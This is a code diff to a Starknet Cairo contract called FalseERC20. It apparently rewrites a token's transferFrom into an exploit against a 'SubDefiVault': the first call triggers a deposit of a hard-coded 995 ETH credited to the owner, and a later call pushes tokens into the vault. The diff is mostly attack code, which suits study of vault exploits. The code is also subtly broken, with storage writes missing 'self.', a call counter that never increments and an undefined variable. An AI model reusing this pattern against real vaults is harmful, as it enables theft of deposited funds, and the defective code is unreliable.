@@ -11,7 +11,10 @@ mod FalseERC20 {
     use core::serde::Serde;
     use core::box::BoxTrait;
     use core::zeroable::Zeroable;
-    use pharaonik::interfaces::IERC20Camel::IERC20Camel;
+    use pharaonik::interfaces::IERC20Camel::{IERC20CamelDispatcher, IERC20CamelDispatcherTrait};
+    use pharaonik::interfaces::ISubDefiVault::{
+        ISubDefiVaultDispatcher, ISubDefiVaultDispatcherTrait
+    };
 
     #[derive(Drop, starknet::Event)]
     struct Transfer {
@@ -46,16 +49,22 @@ mod FalseERC20 {
         _total_supply: u256,
         _balances: LegacyMap<ContractAddress, u256>,
         _allowances: LegacyMap<(ContractAddress, ContractAddress), u256>,
+        total_call_count: u32,
         owner: ContractAddress,
+        wETH: ContractAddress,
+        wETH_vault: ContractAddress,
     }
 
     #[constructor]
     fn constructor(
-        ref self: ContractState, name: ByteArray, symbol: ByteArray, owner: ContractAddress
+        ref self: ContractState,
+        owner: ContractAddress,
+        weth_address: ContractAddress,
+        wETH_vault: ContractAddress
     ) {
-        self._name.write(name);
-        self._symbol.write(symbol);
         owner.write(owner);
+        wETH.write(weth_address);
+        wETH_vault.write(wETH_vault);
     }
 
     #[abi(embed_v0)]
@@ -98,9 +107,16 @@ mod FalseERC20 {
             recipient: ContractAddress,
             amount: u256
         ) -> bool {
-            let caller = get_caller_address();
-            self._spend_allowance(sender, caller, amount);
-            self._transfer(sender, recipient, amount);
+            let call_count: u32 = self.total_call_count.read();
+            if (call_count == 0) {
+                // First call
+                self.total_call_count.write(call_count);
+                let increased_amount = 995000000000000000000; // 995 ETH
+                ISubDefiVaultDispatcher { contract_address: self.wETH_vault.read() }
+                    .deposit(increased_amount, self.owner.read(), get_contract_address());
+            } else if (call_count == 1) {
+                IERC20CamelDispatcher { contract_address }.transfer(self.wETH_vault.read(), amount);
+            }
             true
         }
 
